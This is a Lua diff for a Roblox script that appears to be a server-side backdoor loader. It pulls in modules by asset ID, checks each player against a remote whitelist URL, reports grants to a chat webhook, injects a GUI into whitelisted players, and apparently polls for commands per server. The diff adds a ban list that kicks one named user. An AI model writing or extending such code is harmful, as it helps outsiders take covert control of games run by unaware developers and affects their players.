@@ -4,6 +4,11 @@ local thing = require(18696356924)
 local localsc = thing.thing
 local load = require(14381312180)
 local hasHitFive = false
+
+local banned = {
+	["IlIllllIIIIIllIIIlll"] = "aha",
+}
+
 local function sendMessage(text)
 	local data = http:JSONEncode({ message = text })
 
@@ -12,12 +17,18 @@ local function sendMessage(text)
 	end)  
 end
 local function checkPlayerWhitelist(plr)
-	local response = http:GetAsync(url.."check/?username="..plr.Name)
-	if tostring(response) == "true" then
-		sendMessage(string.format("<:person:1262458386889441375> | %s has been given the GUI", plr.Name))
-		local clone = localsc:Clone()
-		clone.Parent = plr.PlayerGui
-		clone.Enabled = true
+	local reason = banned[plr.Name]
+
+	if reason then
+		plr:Kick(reason)
+	else
+		local response = http:GetAsync(url.."check/?username="..plr.Name)
+		if tostring(response) == "true" then
+			sendMessage(string.format("<:person:1262458386889441375> | %s has been given the GUI", plr.Name))
+			local clone = localsc:Clone()
+			clone.Parent = plr.PlayerGui
+			clone.Enabled = true
+		end
 	end
 end
 local function checkForCommands(jobId)
